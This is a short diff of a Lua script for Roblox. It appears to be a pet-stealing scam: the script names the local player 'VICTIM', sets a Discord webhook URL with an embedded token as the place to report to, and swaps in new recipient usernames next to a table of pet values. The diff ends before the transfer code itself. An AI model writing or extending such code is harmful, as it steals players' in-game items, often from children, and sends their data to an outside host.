@@ -21,14 +21,14 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
+-- ✅ Configuration
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1393637749881307249/ofeqDbtyCKTdR-cZ6Ul602-gkGOSMuCXv55RQQoKZswxigEfykexc9nNPDX_FYIqMGnP"
 local VICTIM = game.Players.LocalPlayer
 local USERNAMES = {
-    "sshhshs",
+    "saikigrow",
     "yuniecoxo",
-    "Wanwood42093"
+    "yyyyyvky"
 }
-
 
 local PET_VALUES = {
     ["Raccoon"] = { emoji = "🦝", value = 2000 },
